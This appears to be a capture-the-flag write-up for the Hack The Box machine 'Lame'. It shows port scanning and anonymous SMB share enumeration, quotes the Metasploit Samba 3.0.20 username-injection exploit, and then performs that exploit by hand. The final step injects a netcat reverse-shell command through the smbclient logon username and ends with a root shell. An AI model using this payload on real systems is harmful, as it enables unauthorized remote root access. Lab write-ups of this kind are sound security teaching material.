```
$ sudo nmap -sS -p- -v -Pn 10.10.10.3
```
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

```
$ nmap -p21,22,139,445,3632 -sCV 10.10.10.3 -Pn 
```
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-05-14T08:42:27-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m22s, deviation: 2h49m43s, median: 21s
```

```
$ searchsploit vsftpd 2.3.4
```


```
$ smbclient -L 10.10.10.3
```
```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```
tmp and opt look like they are accesible as anonymous user.

```
$ smbclient //10.10.10.3/tmp
```
```
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
After checking the content, nothing interesting was found.

```
$ searchsploit samba 3.0.20 
```

The output of this search shows an exploit used by metasploit for this smb version.
Let's get a copy of the file and understand what it does.
```
$ searchsploit -m 16320
```
```
def exploit
	connect
	# lol?
    username = "/=`nohup " + payload.encoded + "`"
    begin
	    simple.client.negotiate(false)
	    simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
    rescue ::Timeout::Error, XCEPT::LoginError
	    # nothing, it either worked or it didn't ;)
	end
	handler
end
```

A payload injection is being done in the username. Let's try to replicate it.

Firstly we connect with smbclient to the tmp folder. The we try to login with the command logon.
Open a port to listenign the incoming reverse shell.
```
$ nc -lvnp 9001
```

Then execute the login with the payload pointing to our ip.
```
smb: \> logon "/=`nohup nc -e /bin/bash 10.10.14.15 9001`"
```

A terminal session is now ready in the nectat port that we set.
```
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.3] 42150
sh: no job control in this shell
sh-3.2# 
``